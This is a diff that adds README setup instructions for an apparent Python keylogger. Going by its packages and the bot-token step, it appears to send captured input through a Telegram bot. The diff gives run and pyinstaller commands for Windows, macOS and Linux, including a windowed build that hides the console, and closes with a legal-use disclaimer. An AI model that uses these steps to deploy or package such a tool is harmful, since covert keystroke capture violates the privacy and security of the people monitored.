@@ -26,3 +26,43 @@ Install Python (3.7+) and ensure `pip` is available for package installations.
 Install necessary packages via `pip`:
 ```bash
 pip install os json pyperclip pynput platform python-telegram-bot
+
+Telegram Bot Setup
+Create a new bot on Telegram BotFather and obtain the bot token.
+Replace "YOUR_TELEGRAM_BOT_TOKEN" in the code with your bot token.
+Platform-Specific Instructions
+Windows
+Clone this repository.
+Run the script with Python:
+bash
+Copy code
+python keylogger.py
+To compile into an executable, use:
+bash
+Copy code
+pyinstaller --onefile keylogger.py
+macOS
+Clone the repository and ensure all required packages are installed.
+Run the script with:
+bash
+Copy code
+python3 keylogger.py
+To build as a standalone executable:
+bash
+Copy code
+pyinstaller --onefile --windowed keylogger.py
+Linux
+Clone the repository and install any missing dependencies.
+Run the script using:
+bash
+Copy code
+python3 keylogger.py
+Compile to executable (optional):
+bash
+Copy code
+pyinstaller --onefile keylogger.py
+Usage Warning
+This tool is intended for legal, authorized use only. Unauthorized use of keyloggers can violate local, state, and federal privacy and data laws. Always obtain proper permissions before monitoring any device.
+
+License
+This project is licensed for educational purposes only. Misuse of this tool is strictly prohibited.
